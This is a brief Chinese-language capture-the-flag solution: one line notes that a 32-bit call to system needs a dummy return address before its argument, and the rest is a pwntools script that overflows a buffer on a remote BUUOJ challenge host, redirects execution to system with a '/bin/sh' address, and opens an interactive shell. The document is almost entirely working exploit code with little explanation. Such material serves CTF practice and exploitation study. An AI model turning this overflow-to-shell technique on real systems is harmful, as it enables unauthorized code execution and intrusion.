**32 位中调用 system 函数时需要传入一个将来的返回地址，这个返回地址随意，但必须要有，返回地址后面则是参数**

```python
from pwn import *

p = remote('node5.buuoj.cn',29920)

binsh = 0x0804a024
system = 0x08048320

p.recvuntil('Input:\n')

payload = b'a' * 140 + p32(system) + p32(0) + p32(binsh)

p.sendline(payload)
p.interactive()
```
